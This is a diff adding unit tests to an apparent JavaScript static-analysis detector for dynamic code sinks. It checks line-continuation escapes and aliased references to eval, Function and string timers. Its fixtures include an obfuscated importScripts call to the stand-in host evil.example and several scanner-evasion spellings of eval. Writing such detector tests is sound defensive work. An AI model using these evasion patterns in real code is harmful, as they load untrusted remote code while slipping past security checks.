@@ -325,8 +325,48 @@ describe('lexical grammar coverage', () => {
     ).toEqual([]);
   });
 
+  it('removes a LINE CONTINUATION when decoding a string', () => {
+    // `\\<newline>` contributes nothing, so this literal IS
+    // `https://evil.example/x.js` at runtime and the scheme must be seen.
+    const code = "importScripts('https:\\\n//evil.example/x.js')";
+    expect(findDynamicCodeSinks(code, [REMOTE_IMPORT_SCRIPTS_SINK])).toHaveLength(1);
+  });
+
   it('decodes escapes inside a computed member string', () => {
     expect(fires("self['\\x65val']('payload')")).toBe(true);
+  });
+});
+
+describe('aliased sinks', () => {
+  // Round 12. A name BOUND to a sink invokes the same global — the last
+  // realistic route left once every spelling of the reference itself is
+  // covered structurally.
+  it.each([
+    ['the Function constructor', "const F = Function; F('return 42')()"],
+    ['eval', 'const e = eval; e(payload)'],
+    ['a string timer', "const t = setTimeout; t('evil()', 0)"],
+    ['an alias of an alias', "const F = Function; const G = F; G('x')()"],
+    ['an alias reached reflectively', "const F = Function; Reflect.apply(F, null, ['x'])()"],
+    ['an alias of a qualified reference', "const e = globalThis.eval; e('payload')"],
+  ])('catches %s', (_label, code) => {
+    expect(fires(code)).toBe(true);
+  });
+
+  it('does not flag an aliased timer given a FUNCTION argument', () => {
+    // The alias resolves, but the argument rule still applies — otherwise
+    // ordinary `const t = setTimeout; t(tick, 0)` code would be flagged.
+    expect(fires('const t = setTimeout; t(tick, 0)')).toBe(false);
+  });
+
+  it('does not flag an unrelated binding', () => {
+    expect(fires("const f = handler; f('x')")).toBe(false);
+    expect(fires("const f = obj.method; f('x')")).toBe(false);
+  });
+
+  it('does not treat a comparison as a binding', () => {
+    // `==`/`===`/`=>` lex differently from the single `=` assignment, so none
+    // of them can create an alias.
+    expect(fires("if (f === Function) { f('x') }")).toBe(false);
   });
 });
 
